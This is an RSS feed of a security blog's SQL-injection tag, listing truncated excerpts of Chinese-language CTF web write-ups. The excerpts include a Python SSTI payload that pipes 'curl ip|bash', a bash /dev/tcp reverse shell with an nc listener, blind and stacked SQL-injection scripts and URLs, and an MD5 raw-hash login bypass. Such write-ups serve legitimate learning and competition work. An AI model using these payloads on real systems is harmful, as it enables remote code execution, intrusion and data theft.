<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>SQLi on wh1sper</title>
    <link>https://anthem-whisper.github.io/tags/sqli/</link>
    <description>Recent content in SQLi on wh1sper</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 20 Feb 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/sqli/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HGAME 2021 Writeup</title>
      <link>https://anthem-whisper.github.io/p/hgame-2021-writeup/</link>
      <pubDate>Sat, 20 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/hgame-2021-writeup/</guid>
      <description>Level - Week3 Forgetful 考点：简单python-SSTI
题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：
最为常规的payload：
{{[].__class__.__mro__[1].__subclasses__()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;curl ip|bash&#39;).read()}}因为命令执行处有waf，所以可以选择直接弹shell：
nc -lvnp 8888bash -i &amp;gt;&amp;amp; /dev/tcp/ip/8888 0&amp;gt;&amp;amp;1姿势还是比较常规；
分享一个从[].__class__.__mro__[1].__subclasses__()查找模块位置的脚本：
#python 3 import re str = &amp;#39;&amp;#39;&amp;#39; [回显内容] &amp;#39;&amp;#39;&amp;#39; list = re.split(&amp;#39;,&amp;#39;, str) for i in range(0, len(list)): if &amp;#39;catch_warnings&amp;#39; in list[i]: print(i) break iki-Jail 考点：MySQL注入，单引号逃逸
熟悉的登录框，熟悉的sql注入
发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。
于是直接使用bp对login.php发包；
进行了简单的fuzz，过滤如下：
由单双引号过滤想到了\逃逸单引号，当我们用户名输入admin\的时候，语句变成了：
SELECT * FROM user WHERE username=&amp;#39;admin\&amp;#39; AND password=&amp;#39;xxx&amp;#39; 那么xxx就变成了sql语句执行，造成了注入；
结果发现只能延时注入：
exp：
#python3,wh1sper import requests import time host = &amp;#39;https://jailbreak.</description>
    </item>
    
    <item>
      <title>纵横杯 Writeup by X1cT34m</title>
      <link>https://anthem-whisper.github.io/p/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/</link>
      <pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/</guid>
      <description>web easyci 考点：MySQL读写文件
和巅峰极客的前端一样，而且发现也是布尔盲注，一阵狂喜；
fuzz一番竟然没有任何过滤
exp:
#python3 import requests import time host = &amp;#39;http://eci-2zegnayqf8pwz72ze2yw.cloudeci1.ichunqiu.com/public/index.php/home/login&amp;#39; def mid(bot, top): return (int)(0.5*(top+bot)) def transToHex(flag): res = &amp;#39;&amp;#39; for i in flag: res += hex(ord(i)) res = &amp;#39;0x&amp;#39; + res.replace(&amp;#39;0x&amp;#39;, &amp;#39;&amp;#39;) return res def sqli(): name = &amp;#39;&amp;#39; for j in range(1, 2000): top = 126 bot = 32 while top &amp;gt; bot: #babyselect = &amp;#39;(database())&amp;#39;#p3rh4ps babyselect = &amp;#39;password&amp;#39;#c3762483bc73d0b7943156d43911ce38-&amp;gt;HEIHEIHEIHEI #babyselect = &amp;#34;&amp;#34; payload = &amp;#34;0&amp;#39;||ascii(substr({},{},1))&amp;gt;{}#&amp;#34;.</description>
    </item>
    
    <item>
      <title>RoarCTF 2020</title>
      <link>https://anthem-whisper.github.io/p/roarctf-2020/</link>
      <pubDate>Mon, 07 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/roarctf-2020/</guid>
      <description>ezsql 考点：布尔盲注，MySQL_8.0.19新特性table语句，无列名盲注
截图截没有了，忘了，简单说下思路：
传统艺能sqli，本来是一个常规的布尔盲注，不过由于waf写的很黑，大小写ban掉了select，导致没有办法跨表查询，只能同表查询或者查库名：
admin&#39;/**/and/**/ascii(substr(database(),1,1))&amp;gt;32#//库名ctfadmin&#39;/**/and/**/ascii(substr(password,1,1))&amp;gt;32#//密码b4bc4c343ed120df3bff56d586e6d617本来测出来有堆叠，但是由于waf写的很黑，堆叠也胎死腹中。
注出来密码md5(gml666)==b4bc4c343ed120df3bff56d586e6d617之后，登陆，提示no flag； 由于waf写的很黑，这到题如果MySQL版本不是&amp;gt;=8.0.19的话就是没有方法做的；
我们能够在官方文档找到以下资料
 The TABLE statement in some ways acts like SELECT. Given the existance of a table named t, the following two statements produce identical output:
TABLE t; SELECT * FROM t; You can order and limit the number of rows produced by TABLE using ORDER BY and LIMIT clauses, respectively. These function identically to the same clauses when used with SELECT (including an optional OFFSET clause with LIMIT)</description>
    </item>
    
    <item>
      <title>N1CTF2020</title>
      <link>https://anthem-whisper.github.io/p/n1ctf2020/</link>
      <pubDate>Tue, 20 Oct 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/n1ctf2020/</guid>
      <description>N1CTF打不过根本打不过，就做了个签到
 SignIn 考点：反序列化，布尔盲注，报错注入
这是源码：
&amp;lt;?phphighlight_file(__FILE__);class ip {public $ip;public function waf($info){}public function __construct() {if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){$this-&amp;gt;ip = $this-&amp;gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);}else{$this-&amp;gt;ip =$_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;];}}public function __toString(){$con=mysqli_connect(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;********&amp;quot;,&amp;quot;n1ctf_websign&amp;quot;);$sqlquery=sprintf(&amp;quot;INSERT into n1ip(`ip`,`time`) VALUES (&#39;%s&#39;,&#39;%s&#39;)&amp;quot;,$this-&amp;gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]),time());if(!mysqli_query($con,$sqlquery)){return mysqli_error($con);}else{return &amp;quot;your ip looks ok!&amp;quot;;}mysqli_close($con);}}class flag {public $ip;public $check;public function __construct($ip) {$this-&amp;gt;ip = $ip;}public function getflag(){if(md5($this-&amp;gt;check)===md5(&amp;quot;key****************&amp;quot;)){readfile(&#39;/flag&#39;);}return $this-&amp;gt;ip;}public function __wakeup(){if(stristr($this-&amp;gt;ip, &amp;quot;n1ctf&amp;quot;)!</description>
    </item>
    
    <item>
      <title>DozerCTF2020_web</title>
      <link>https://anthem-whisper.github.io/p/dozerctf2020_web/</link>
      <pubDate>Mon, 15 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/dozerctf2020_web/</guid>
      <description>又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了
 sqli-labs 0 考点：URL二次编码，堆叠注入
堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。
查看库名：
?id=1%2527;show%20databases;%23 查看表名：
?id=1%2527;show%20tables;%23查看表的第一条数据：
?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 flag{594cb6af684ad354b4a59ac496473990}
白给的反序列化 考点：PHP反序列化
开题送码：
&amp;lt;?phpclass home{private $method;private $args;function __construct($method, $args){$this-&amp;gt;method = $method;$this-&amp;gt;args = $args;}function __destruct(){if (in_array($this-&amp;gt;method, array(&amp;quot;mysys&amp;quot;))) {call_user_func_array(array($this, $this-&amp;gt;method), $this-&amp;gt;args);}}function mysys($path){print_r(base64_encode(exec(&amp;quot;cat $path&amp;quot;)));}function waf($str){if (strlen($str) &amp;gt; 8) {die(&amp;quot;No&amp;quot;);}return $str;}function __wakeup(){$num = 0;foreach ($this-&amp;gt;args as $k =&amp;gt; $v) {$this-&amp;gt;args[$k] = $this-&amp;gt;waf(trim($v));$num += 1;if ($num &amp;gt; 2) {die(&amp;quot;No&amp;quot;);}}}}if ($_GET[&#39;path&#39;]) {$path = @$_GET[&#39;path&#39;];unserialize($path);} else {highlight_file(__FILE__);}?</description>
    </item>
    
    <item>
      <title>WHUCTF2020</title>
      <link>https://anthem-whisper.github.io/p/whuctf2020/</link>
      <pubDate>Sun, 24 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/whuctf2020/</guid>
      <description>武汉大学的CTF，难的简单的都有，最近比赛是真滴多，打完金盆洗手了
 Easy_sqli 考点：bool盲注，双写绕过
简单，没啥好讲的
#wh1sperimport requestshost = &#39;http://218.197.154.9:10011/login.php#&#39;def mid(bot, top):return (int)(0.5 * (top + bot))def sqli():name = &#39;&#39;for j in range(1, 250):top = 126bot = 32while 1:babyselect = &#39;(seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w)&#39;#select = &amp;quot;1&#39; oorr ascii(substr(&amp;quot;+babyselect+&amp;quot;,{},1))&amp;gt;{} #&amp;quot;.format(j, mid(bot, top))data = {&amp;quot;user&amp;quot;: select, &amp;quot;pass&amp;quot;: &amp;quot;a&amp;quot;}r = requests.post(url=host, data=data)#print(data)if &#39;Login success!&#39; in r.text: # 成功if top - 1 == bot: # top和bot相邻，说明name是topname += chr(top)print(name)breakbot = mid(bot, top) # 成功就上移botelse: # 失败if top - 1 == bot: # top和bot相邻，加上失败，说明name是botname += chr(bot)print(name)breaktop = mid(bot, top) # 失败就下移topif __name__ == &#39;__main__&#39;:sqli()WHUCTF{r3lly_re11y_n0t_d1ffIcult_yet?</description>
    </item>
    
    <item>
      <title>MD5哈希注入</title>
      <link>https://anthem-whisper.github.io/p/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Wed, 15 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/</guid>
      <description>在网上看到一道CTF题目：https://ctf.show/challenges#web9
打开后扫目录发现robots.txt，里面提示了index.phps，下载，审计，发现MD5哈希注入：
&amp;lt;?php$flag=&amp;quot;&amp;quot;;$password=$_POST[&#39;password&#39;];if(strlen($password)&amp;gt;10){die(&amp;quot;password error&amp;quot;);}$sql=&amp;quot;select * from user where username =&#39;admin&#39; and password =&#39;&amp;quot;.md5($password,true).&amp;quot;&#39;&amp;quot;;$result=mysqli_query($con,$sql);if(mysqli_num_rows($result)&amp;gt;0){while($row=mysqli_fetch_assoc($result)){echo &amp;quot;登陆成功&amp;lt;br&amp;gt;&amp;quot;;echo $flag;}}?&amp;gt;问题出在第7行md5($password,true)，密码使用了 md5 以二进制形式加密后进行在数据库中进行查询，若查询到了数据，就返回成功。
第一种方法是将加密后的密码构造出类似 &#39; or &amp;lsquo;1&amp;rsquo; 的形式
&amp;lt;?php$v = &#39;a&#39;;$payload2 = &amp;quot;&#39;or&#39;&amp;quot;;while(1){$hash = hash(&amp;quot;md5&amp;quot;,$v,true);if(substr_count($hash, $payload2) == 1){die($v); }$v++;}?&amp;gt;这是网上的脚本不过我倒是没跑出来。。。
这里 $v++ 其实是按照 ascii 字符进行后移的；
最后可以得到一个结果 ffifdyop
将这个加密回去试试，看到确实是&#39;or&#39;的形式
那么只要我们随意输入一个用户名，密码为 ffifdyop 那么这样我们的语句就变成了：
select * from users where user = &#39;admin&#39; and password = &#39;&#39;or&#39;6蒥欓!</description>
    </item>
    
    <item>
      <title>BUUOJ刷题记录</title>
      <link>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</link>
      <pubDate>Sat, 04 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</guid>
      <description>[SUCTF 2019]EasySQL 考点：堆叠注入、MySQL中sql_mode参数
题目存在过滤，尝试之后发现可以通过0 || 1这样的语句进行bool盲注，但是此题似乎限制了输入信息的长度，所以这个盲注只能注出来库名CTF后面的东西就没办法搞，后来看了wp之后才知道存在堆叠注入，尝试之：
1;并没有报错，而且返回了查询成功额页面，所以存在堆叠注入
1;show databases;返回
Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; ctf ) Array ( [0] =&amp;gt; ctftraining ) Array ( [0] =&amp;gt; information_schema ) Array ( [0] =&amp;gt; mysql ) Array ( [0] =&amp;gt; performance_schema ) Array ( [0] =&amp;gt; test )表名：
1;show tables;返回：
Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; Flag )但是flag关键字被过滤了，</description>
    </item>
    
  </channel>
</rss>
